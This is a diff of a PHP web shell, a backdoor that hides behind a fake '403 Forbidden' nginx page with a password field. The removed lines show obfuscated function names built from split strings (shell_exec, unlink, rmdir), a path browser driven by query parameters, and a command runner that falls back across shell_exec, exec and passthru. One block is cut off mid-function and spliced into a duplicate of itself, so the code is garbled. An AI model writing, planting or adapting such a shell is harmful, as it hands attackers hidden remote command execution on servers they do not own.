@@ -12,7 +12,7 @@ function Login() {
 
 function VEsetcookie($k, $v) {
     $_COOKIE[$k] = $v;
-    setcookie($k, $v);
+    setcookie($k, $v, time() + 86400 * 30, "/");
 }
 
 if (!empty($auth_pass)) {
@@ -25,57 +25,6 @@ if (!empty($auth_pass)) {
     if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != md5($auth_pass))) {
         Login();
     }
-}
-?><?php
-error_reporting(0);
-ob_start();
-
-$x1 = 'shel' . 'l_exe' . 'c'; 
-$x2 = 'file_put_' . 'contents';
-$x5 = 'un' . 'link'; 
-$x6 = 'rm' . 'dir'; 
-$x7 = 'file_get_' . 'contents';
-
-function norm_path($path) {
-    if (!$path) return getcwd();
-    return str_replace('\\', '/', $path);
-}
-
-$dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
-if (!is_dir($dir)) { $dir = getcwd(); }
-$dir = norm_path($dir);
-
-function run_cmd_safe($cmd, $cwd = '') {
-    if (!empty($cwd)) {
-        $cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd;
-    }
-    $cmd = $cmd . " 2>&1";
-    $out = "";
-    
-    if (function_exists('shell_exec')) {
-        $out = @shell_exec($cmd);
-    } elseif (function_exists('exec')) {
-        @exec($cmd, $a);
-        $out = implode("\n", $a);
-    } elseif (function_exists('passthru')) {
-        ob_start();<?php
-$auth_pass = "6f6f30d8f9e1397d26524a99e8c97aaa0e7c2df62dbd4f3b55735e5edc91e86a";
-
-function Login() {
-  die("<!DOCTYPE html><html><head><title>403 Forbidden</title><style>body{background:#08090d;color:#ff3366;font-family:monospace;display:flex;height:100vh;align-items:center;justify-content:center;margin:0}.box{background:rgba(18,20,29,0.8);padding:40px;border-radius:12px;border:1px solid rgba(255,51,102,0.3);text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.8)}h1{font-size:3rem;margin:0 0 10px 0;text-shadow:0 0 15px rgba(255,51,102,0.4)}p{color:#8c94a8;margin-bottom:20px;font-size:0.9rem}input[type=password]{background:#12141d;border:1px solid #222634;color:#fff;text-align:center;padding:10px 16px;border-radius:6px;outline:none;font-size:1rem;transition:0.3s}input[type=password]:focus{border-color:#ff3366;box-shadow:0 0 10px rgba(255,51,102,0.3)}</style></head><body><div class='box'><h1>403 FORBIDDEN</h1><p>nginx (apache v.5162 ./daemonn_sys)</p><form method='post'><input type='password' name='pass' placeholder='Access Token' autofocus></form></div></body></html>");
-}
-
-function VEsetcookie($k, $v) {
-    $_COOKIE[$k] = $v;
-    setcookie($k, $v, time() + 86400 * 30, "/");
-}
-
-if (!empty($auth_pass)) {
-    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
-        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
-
-    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
-        Login();
 }
 ?><?php
 error_reporting(0);
